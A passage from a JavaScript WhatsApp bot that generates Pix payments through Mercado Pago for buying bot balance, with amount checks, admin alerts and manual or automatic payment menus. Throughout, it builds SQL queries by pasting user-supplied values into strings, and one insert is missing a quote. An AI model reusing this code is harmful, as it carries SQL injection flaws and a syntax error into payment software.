'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            Array_Digitos_Nao_Deveria = VALOR_RECARGA.match(/[^0-9]/igm);
            if (Array_Digitos_Nao_Deveria != null) {
                Texto = `⚠️ Apenas números são permitidos.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            Array_Digitos_Nao_Deveria = VALOR_RECARGA.match(/[^/pix\s\d+]/igm);
            if (Array_Digitos_Nao_Deveria != null) {
                Texto = `⚠️ Formato esquisito... Olhe alguns exemplos abaixo de como fazer...

*Exemplo de como criar um Pix de 15 reais:*
/pix 15

*Exemplo de como criar um Pix de 40 reais:*
/pix 40

Decida qualquer valor que queira colocar e só pôr depois do /pix`

                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            MIN_RECARGA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MIN_RECARGA'`).get()["VALOR"]
            MIN_RECARGA = parseFloat(MIN_RECARGA).toFixed(2);

            if (parseFloat(VALOR_RECARGA) < parseFloat(MIN_RECARGA)) {
                Texto = `⚠️ São aceitas apenas recargas de no mínimo R$:${MIN_RECARGA}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            LIMITE_GERAR_PIX = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'LIMITE_GERAR_PIX'`).get()["VALOR"]
            LIMITE_GERAR_PIX = parseFloat(LIMITE_GERAR_PIX).toFixed(2)

            if (parseFloat(VALOR_RECARGA) > parseFloat(LIMITE_GERAR_PIX)) {
                Texto = `⚠️ O Valor excede o limite total de PIX a ser gerado de uma vez só! Nossa equipe foi notificada sobre sua tentativa!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Texto = `⚠️*ATENÇÃO ADMS!*

O USUÁRIO wa.me/${Numero} TENTOU GERAR UM PIX DE R$:${VALOR_RECARGA} QUE EXCEDE O LIMITE DEFINIDO DE R$:${LIMITE_GERAR_PIX}`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            await DataBase_Better.prepare(`UPDATE PIX_COPIA_COLA SET PROCESSADO = '3' WHERE NUMERO_QUEM_GEROU = '${Mensagem_From}' AND PROCESSADO = '0'`).run()

            var options = {
                mode: 'text', args: [TOKEN_MP, VALOR_RECARGA, TITULO_PRODUTO]
            };
            PythonShell.run('CriarPIXMP2.py', options, async function (error, Resultado) {
                if (error) {
                    console.log(error)

                    Texto = `Erro ao gerar chave pix! O desenvolvedor foi notificado!`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                    Texto = `ATENÇÃO! NÃO CONSEGUI GERAR O PIX COPIA E COLA PARA UM CLIENTE.

Cliente = wa.me/${Numero}

Error = ${error}`
                    Texto = Texto.toString().replace(/\'/igm,"");
                    console.log(Texto)
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us,
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                };

                try {
                    console.log(Resultado)
                    Div = (Resultado).toString().split("|")
                    iD_Pagamento = Div[0]
                    Link_Copia_Cola_Pix = Div[1]

                    await DataBase_Better.prepare(`INSERT INTO PIX_COPIA_COLA (ID_PAGAMENTO,CHAVE_PIX_COP_COL,NUMERO_QUEM_GEROU,VALOR,PROCESSADO,DATA_INSERIDO_MS) VALUES ('${iD_Pagamento}','${Link_Copia_Cola_Pix}','${Mensagem_From}','${VALOR_RECARGA}','0','${Date.now()}')`).run()

                    Texto = `✨ *COMPRAR SALDO*

⚠️ Você está prestes a comprar saldo para usar no bot!

⚠️ Para poder pagar, geramos um PIX com duração de 30 minutos, use ele para pagar com o seu banco via PIX usando o pix copia e cola abaixo.

⚠️ O saldo irá cair em até 1 minuto após o pagamento via pix. Caso ocorra algum erro após o pagamento, por favor avise o suporte do bot, que te ajudaremos.

⚠️ *ADICIONE APENAS O SALDO QUE IRÁ UTILIZAR, POIS NÃO FAZEMOS REEMBOLSO!*


━━━━━━━━❪❃❫━━━━━━━━

- *ID da Compra:* ${iD_Pagamento}

💰 *Valor:* R$: ${VALOR_RECARGA}
(Por questões de identificação, o valor pode ter sido alterado.)

━━━━━━━━❪❃❫━━━━━━━━

🔑 *O CÓDIGO PIX COPIA-E-COLA FOI ENVIADO EM UMA MENSAGEM SEPARADA (ESSA MESMO ABAIXO) PARA FACILITAR NA HORA DE COPIAR O CÓDIGO PARA EFETUAR O PAGAMENTO.*
`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Link_Copia_Cola_Pix}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                    Texto = `*AO EFETUAR O PAGAMENTO, AGUARDE 10 SEGUNDOS E MANDE QUALQUER MENSAGEM.*`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                } catch (error) {
                    console.log(error)

                    Texto = `Erro ao gerar chave pix! O desenvolvedor foi notificado!`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                    Texto = `ATENÇÃO! NÃO CONSEGUI GERAR O PIX COPIA E COLA PARA UM CLIENTE.

Cliente = wa.me/${Numero}

Error = ${error}`
                    Texto = Texto.toString().replace(/\'/igm,"");
                    console.log(Texto)
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            })
            return;
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("ADICIONAR SALDO") > -1 || Mensagem_Texto.toString() === "/add") {

            if (Mensagem_Texto.indexOf("ADICIONAR SALDO") > -1) {

                HABILITAR_PIX_MANUAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HABILITAR_PIX_MANUAL'`).get()["VALOR"]
                HABILITAR_PIX_AUTO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HABILITAR_PIX_AUTO'`).get()["VALOR"]

                CONSTRUCAO_LISTMESSAGE_buttonText = 'OPÇÕES DE PAGAMENTO'
                CONSTRUCAO_LISTMESSAGE_title = `OPÇÕES`
                CONSTRUCAO_LISTMESSAGE_description = `*Nesta página você escolhe como você deseja adicionar o saldo.*

⚠️ *UTILIZE O COMANDO DE PIX, APENAS SE FOR EFETUAR O PAGAMENTO DO MESMO*

⚠️ *CASO VOCÊ GERE MAIS DE 2 PIX E NÃO PAGAR NENHUM, VOCÊ SERÁ BLOQUEADO PELO BOT E ASSIM PERDENDO TODO O SEU SALDO.*`

                CONSTRUCAO_LISTMESSAGE_rows = []
                iD_Footer = Date.now()

                if ((HABILITAR_PIX_AUTO) === "1") {
                    CONSTRUCAO_LISTMESSAGE_rows.push(
                        {
                            rowId: `${iD_Footer.toString()}|`,
                            title: "⚪ PIX AUTOMÁTICO",
                            description: "Pague o Pix copia-e-cola e clique em PAGUEI para receber seu saldo.",
                        },
                    )
                }
                if ((HABILITAR_PIX_MANUAL) === "1") {
                    CONSTRUCAO_LISTMESSAGE_rows.push(
                        {
                            rowId: `${iD_Footer.toString()}|`,
                            title: "⚪ PIX MANUAL",
                            description: "Copie a chave PIX e envie o comprovante para o responsável.",
                        },
                    )
                }
                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "🔙 MENU",
                        description: "Menu incial.",
                    },
                )
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (Mensagem_Texto.toString() === "/add") {

                Titulo = `💰 PIX AUTOMÁTICO`

                TEXTO_PIX_AUTOMATICO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_PIX_AUTOMATICO'`).get()["VALOR"]
                if (TEXTO_PIX_AUTOMATICO.toString() === "0") {
                    MIN_RECARGA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MIN_RECARGA'`).get()["VALOR"]
                    Exemplo_1 = parseInt(MIN_RECARGA)
                    Exemplo_2 = parseInt(MIN_RECARGA) + 3
                    Exemplo_3 = parseInt(MIN_RECARGA) + 15
                    Exemplo_4 = parseInt(MIN_RECARGA) + 47

                    Texto = `💰 *PIX AUTOMÁTICO - TUTORIAL*

*Para adicionar saldo na store,use o comando /pix, seguido da quantidade desejada.*

*A RECARGA MÍNIMA É: R$:${MIN_RECARGA}*

*EXEMPLOS:*

*Para criar um pagamento de R$:${parseFloat(Exemplo_1).toFixed(2)}*
/pix ${Exemplo_1}

*Para criar um pagamento de R$:${parseFloat(Exemplo_2).toFixed(2)}*
/pix ${Exemplo_2}

*Para criar um pagamento de R$:${parseFloat(Exemplo_3).toFixed(2)}*
/pix ${Exemplo_3}

*Para criar um pagamento de R$:${parseFloat(Exemplo_4).toFixed(2)}*
/pix ${Exemplo_4}


*VOCÊ PODE RECARREGAR O QUANTO QUISER A CIMA DE R$:${MIN_RECARGA}, SÓ TROCAR O VALOR DO COMANDO...*

Após o envio do comando, será gerado um código pix "Copia e Cola", para qual você irá efetuar o pagamento utilizando o aplicativo do seu banco de preferência, na sessão: Pix > Copia e Cola
`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                } else {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'Erro...',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("PIX MANUAL") > -1) {
            CHAVE_PIX = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHAVE_PIX'`).get()["VALOR"]
            INFO_PIX = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'INFO_PIX'`).get()["VALOR"]
            MIN_RECARGA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MIN_RECARGA'`).get()["VALOR"]
            TEXTO_SUPORTE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_SUPORTE'`).get()["VALOR"]

            CONSTRUCAO_LISTMESSAGE_buttonText = "OPÇÕES"
            CONSTRUCAO_LISTMESSAGE_title = `✨ *PIX MANUAL`
            CONSTRUCAO_LISTMESSAGE_description = `✨ *PIX MANUAL*

*CHAVE PIX:* ${CHAVE_PIX}

*INFORMAÇÕES:* ${INFO_PIX}

━━━━━━━━━━━━━━━━━━━━━━

*⚠️ ATENÇÃO! O MÍNIMO PARA RECARGA É R$:${parseFloat(MIN_RECARGA).toFixed(2)}*

━━━━━━━━━━━━━━━━━━━━━━

*✨ NOS ENVIE O COMPROVANTE!*

${TEXTO_SUPORTE}


*Mandei a CHAVE PIX em uma mensagem separada, para que você copie com mais facilidade.*
`
            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            CONSTRUCAO_LISTMESSAGE_rows.push(
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "🔙 MENU",
                    description: "Menu incial.",
                }
            )
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${CHAVE_PIX}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("PIX AUTOMÁTICO") > -1) {

            CONSTRUCAO_LISTMESSAGE_buttonText = "OPÇÕES"
            CONSTRUCAO_LISTMESSAGE_title = `💰 PIX AUTOMÁTICO`

            TEXTO_PIX_AUTOMATICO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_PIX_AUTOMATICO'`).get()["VALOR"]
            if (TEXTO_PIX_AUTOMATICO.toString() === "0") {
                MIN_RECARGA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MIN_RECARGA'`).get()["VALOR"]
                Exemplo_1 = parseInt(MIN_RECARGA)
                Exemplo_2 = parseInt(MIN_RECARGA) + 3
                Exemplo_3 = parseInt(MIN_RECARGA) + 15
                Exemplo_4 = parseInt(MIN_RECARGA) + 47

                Texto = `💰 *PIX AUTOMÁTICO - TUTORIAL*

*Para adicionar saldo na store,use o comando /pix, seguido da quantidade desejada.*

*A RECARGA MÍNIMA É: R$:${MIN_RECARGA}*

*EXEMPLOS:*

*Para criar um pagamento de R$:${parseFloat(Exemplo_1).toFixed(2)}*
/pix ${Exemplo_1}

*Para criar um pagamento de R$:${parseFloat(Exemplo_2).toFixed(2)}*
/pix ${Exemplo_2}

*Para criar um pagamento de R$:${parseFloat(Exemplo_3).toFixed(2)}*
/pix ${Exemplo_3}

*Para criar um pagamento de R$:${parseFloat(Exemplo_4).toFixed(2)}*
/pix ${Exemplo_4}


*VOCÊ PODE RECARREGAR O QUANTO QUISER A CIMA DE R$:${MIN_RECARGA}, SÓ TROCAR O VALOR DO COMANDO...*

Após o envio do comando, será gerado um código pix "Copia e Cola", para qual você irá efetuar o pagamento utilizando o aplicativo do seu banco de preferência, na sessão: Pix > Copia e Cola
`

            } else {
                Texto = TEXTO_PIX_AUTOMATICO
            }
            CONSTRUCAO_LISTMESSAGE_description = Texto

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            CONSTRUCAO_LISTMESSAGE_rows.push(
